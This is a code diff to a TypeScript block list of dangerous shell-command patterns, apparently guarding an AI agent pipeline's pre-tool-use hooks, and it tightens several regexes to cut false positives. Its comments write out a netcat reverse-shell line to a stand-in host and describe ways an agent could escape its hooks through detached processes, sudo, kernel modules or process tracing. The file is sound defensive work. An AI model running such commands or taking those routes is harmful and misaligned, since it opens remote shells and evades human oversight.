@@ -465,7 +465,9 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   { pattern: /\bsocat\b.*\bSYSTEM:/, category: "reverse-shell" },
   // Reverse shell via mkfifo — `mkfifo /tmp/f; nc evil.com 4444 < /tmp/f | bash > /tmp/f 2>&1`
   // creates a named pipe to tunnel a shell session over netcat. mkfifo has no legitimate use in Bloom.
-  { pattern: /\bmkfifo\b/, category: "reverse-shell" },
+  // Anchored to command-start boundaries (^, ;, &, |) to prevent false positives on commands
+  // that reference "mkfifo" as a grep/echo argument.
+  { pattern: /(?:^|[;&|]\s*)mkfifo\b/, category: "reverse-shell" },
   // Persistence via command scheduling — `at` and `batch` schedule commands to execute outside the
   // current agent session, completely bypassing PreToolUse hooks for the deferred invocation.
   // Anchored to command-start boundaries (^, ;, &, |) to avoid false positives on commands
@@ -529,8 +531,10 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   // Kernel-module loading — `insmod` and `modprobe` load native code directly into ring-0.
   // A loaded module persists across reboots, can intercept any syscall, and cannot be
   // observed or blocked by userspace hook interception. Neither has legitimate use in Bloom.
-  { pattern: /\binsmod\b/, category: "kernel-module-loading" },
-  { pattern: /\bmodprobe\b/, category: "kernel-module-loading" },
+  // Anchored to command-start boundaries (^, ;, &, |) to prevent false positives on commands
+  // that reference these names as grep/echo arguments.
+  { pattern: /(?:^|[;&|]\s*)insmod\b/, category: "kernel-module-loading" },
+  { pattern: /(?:^|[;&|]\s*)modprobe\b/, category: "kernel-module-loading" },
   // Kernel parameter tampering — `sysctl -w key=val` / `sysctl --write key=val` modifies live
   // kernel parameters: e.g. re-enabling disabled profiling interfaces
   // (kernel.perf_event_paranoid=0) or destabilising memory accounting
@@ -540,19 +544,25 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   // agent session, letting it outlive the evolution cycle entirely. `disown` achieves the same
   // by removing a background job from the shell's job table. Same threat model as `at`/`batch`.
   // Neither has legitimate use in Bloom's pipeline.
-  { pattern: /\bnohup\b/, category: "persistence" },
-  { pattern: /\bdisown\b/, category: "persistence" },
+  // Anchored to command-start boundaries (^, ;, &, |) to prevent false positives on commands
+  // that reference these names as grep/echo arguments (e.g. grep 'nohup' README.md).
+  { pattern: /(?:^|[;&|]\s*)nohup\b/, category: "persistence" },
+  { pattern: /(?:^|[;&|]\s*)disown\b/, category: "persistence" },
   // Privilege escalation — `sudo cmd` / `su -c cmd` / `pkexec cmd` run child processes as root,
   // meaning every DANGEROUS_PATTERNS guard is silently bypassed for the elevated child process
   // (PreToolUse never inspects it). None have legitimate use in Bloom's pipeline.
-  { pattern: /\bsudo\b/, category: "privilege-escalation" },
+  // Anchored to command-start boundaries (^, ;, &, |) to prevent false positives on commands
+  // that reference "sudo" as a grep/echo argument (e.g. echo "use sudo for system ops").
+  { pattern: /(?:^|[;&|]\s*)sudo\b/, category: "privilege-escalation" },
   { pattern: /\bsu\b.*-c\b/, category: "privilege-escalation" },
   { pattern: /\bpkexec\b/, category: "privilege-escalation" },
   // Process tracing — `strace -p <pid>` and `ltrace -p <pid>` attach to running processes via
   // ptrace, dumping arbitrary memory contents, credentials, file descriptors, and syscalls in
   // real time without network access. Neither has legitimate use in Bloom's pipeline.
-  { pattern: /\bstrace\b/, category: "process-tracing" },
-  { pattern: /\bltrace\b/, category: "process-tracing" },
+  // Anchored to command-start boundaries (^, ;, &, |) to prevent false positives on commands
+  // that reference these names as grep/echo arguments.
+  { pattern: /(?:^|[;&|]\s*)strace\b/, category: "process-tracing" },
+  { pattern: /(?:^|[;&|]\s*)ltrace\b/, category: "process-tracing" },
   // Session-persistence via multiplexer — `screen -dm cmd` and `tmux new-session -d` both spawn
   // fully detached processes that outlive the evolution cycle; identical threat model to nohup/disown.
   // `screen -dm` uses lookaheads to match both -d and -m flags in any combined or separate form.
